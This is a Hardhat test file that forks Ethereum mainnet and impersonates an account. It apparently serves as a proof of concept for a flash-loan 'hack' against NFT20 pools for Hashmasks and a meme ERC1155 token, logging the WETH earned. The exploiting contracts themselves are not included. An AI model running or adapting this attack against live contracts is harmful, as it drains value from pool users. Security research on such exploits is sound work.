// For mainnet block number 12069925 with this command:
// npx hardhat node --fork https://mainnet.infura.io/v3/INFURA_KEY  --fork-block-number 12069925

const { assert, expect } = require("chai");

const NFT20_PAIR = "0xc2bde1a2fa26890c8e6acb10c91cc6d9c11f4a73";
const MEME_PAIR = "0x60acd58d00b2bcc9a8924fdaa54a2f7c0793b3b2";
let account = "0x4B5922ABf25858d012d12bb1184e5d3d0B6D6BE4";

const TOKENS = [
	930,
	14344,
	2248,
	14483,
	13728,
	13844,
	9433,
	10046,
	10229,
	14369,
	12790,
	4514,
	4976,
	10185,
	13954,
	15634,
	14985,
	4143,
	14381,
	12412,
];

const MEME_TOKENS = [1];

const hre = require("hardhat");

describe("Contracts", () => {
	before(async () => {
		await hre.network.provider.request({
			method: "hardhat_impersonateAccount",
			params: [account],
		});
		signer = await ethers.provider.getSigner(account);

		weth = await ethers.getContractAt(
			"@openzeppelin/contracts/token/ERC20/ERC20.sol:ERC20",
			"0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"
		);
		hashMasks = await ethers.getContractAt(
			"@openzeppelin/contracts/token/ERC721/ERC721.sol:ERC721",
			"0xC2C747E0F7004F9E8817Db2ca4997657a7746928"
		);
		meme = await ethers.getContractAt(
			"@openzeppelin/contracts/token/ERC1155/ERC1155.sol:ERC1155",
			"0xe4605d46fd0b3f8329d936a8b258d69276cba264"
		);
		nct = await ethers.getContractAt(
			"INCT",
			"0x8A9c4dfe8b9D8962B31e4e16F8321C44d48e246E"
		);

		Factory = await ethers.getContractAt(
			"NFT20FactoryV4",
			"0x0f4676178b5c53Ae0a655f1B19A96387E4b8B5f2"
		);

		MemePair = await ethers.getContractAt("NFT20Pair", MEME_PAIR);
		HashMaskPair = await ethers.getContractAt("NFT20Pair", NFT20_PAIR);
		Flashloan = await ethers.getContractFactory("HashMaskFlash");
		flashloan = await Flashloan.deploy();

		// deploy meme erc1155 flash

		MemeFlash = await ethers.getContractFactory("MemeFlash");
		memeFlash = await MemeFlash.deploy();
	});

	it.skip("List Hashmasks in pool", async function () {
		let listSize = await hashMasks.balanceOf(NFT20_PAIR);
		console.log("Amount NFTs in pool:", Number(listSize));
		let tokens = [];
		// for (let index = 0; index < 10; index++) {
		for (let index = 0; index < listSize; index++) {
			const id = await hashMasks.tokenOfOwnerByIndex(NFT20_PAIR, index);

			const claimable = await nct.accumulated(id);

			tokens.push({
				id: Number(id),
				claimable: Number(ethers.utils.formatEther(String(claimable))),
			});
		}

		tokens = tokens.sort((a, b) => b.claimable - a.claimable);

		console.log(tokens);
	});

	it("should execute hack", async function () {
		console.log("Prepare flashloan", await Factory.logic());
		let listSize = Number(
			ethers.utils.formatEther(String(await hashMasks.balanceOf(NFT20_PAIR)))
		);
		let supplyBefore = Number(
			ethers.utils.formatEther(String(await HashMaskPair.totalSupply()))
		);
		console.log(supplyBefore);
		balance = await weth.balanceOf(account);
		before = Number(ethers.utils.formatEther(String(balance)));
		console.log("balance before", before);
		let fl_tx = await HashMaskPair.connect(signer).flashLoan(
			TOKENS,
			TOKENS,
			flashloan.address,
			"0x"
		);
		balance = await weth.balanceOf(account);
		after = Number(ethers.utils.formatEther(String(balance)));
		console.log("balance after", after);
		console.log("earned:", after - before);
		let listSizeAfter = Number(
			ethers.utils.formatEther(String(await hashMasks.balanceOf(NFT20_PAIR)))
		);
		let supplyAfter = Number(
			ethers.utils.formatEther(String(await HashMaskPair.totalSupply()))
		);

		expect(listSizeAfter).to.equal(listSize);
		expect(supplyBefore).to.equal(supplyAfter);

		/*    const topTokens = TOKENS.map((t) => t.id).slice(0, AMOUNT_TOKENS);
        console.log("\tTokens to claim", topTokens.length);
        console.log(topTokens);
        const params = web3.eth.abi.encodeParameters(["uint256[]"], [topTokens]);
        const tx = await flashloan.initiateFlashloan(
            ethers.utils.parseEther(String(1.3)),
            params,
            {
                gasPrice,
            }
        );
        const { gasUsed } = await web3.eth.getTransactionReceipt(tx.hash);
        const gasCost = (gasPrice * Number(gasUsed)) / 1e18;
        const balance = await weth.balanceOf(flashloan.address);
        const earned = Number(ethers.utils.formatEther(String(balance)));
        console.log("\tETH Earned in FL:", earned);
        console.log("\tTransaction Cost", gasCost);
        console.log("\tReal Profit:", earned - gasCost);
        // assert(Number(ethers.utils.formatEther(String(balance))) > gasCost);
        */
	});

	it("should execute ERC1155 hack", async function () {
		console.log("Prepare flashloan", await Factory.logic());
		console.log("Memepair ADD", MemePair.address);

		let bal = await meme.balanceOf(MemePair.address, 1);

		console.log("balance of meme id #1 in pair ", bal.toString());
		let fl_tx = await MemePair.connect(signer).flashLoan(
			[1],
			[1],
			memeFlash.address,
			"0x"
		);

		console.log("success");

		let balAfterLoan = await meme.balanceOf(MemePair.address, 1);
		expect(parseInt(bal)).to.equal(parseInt(balAfterLoan));
	});
});
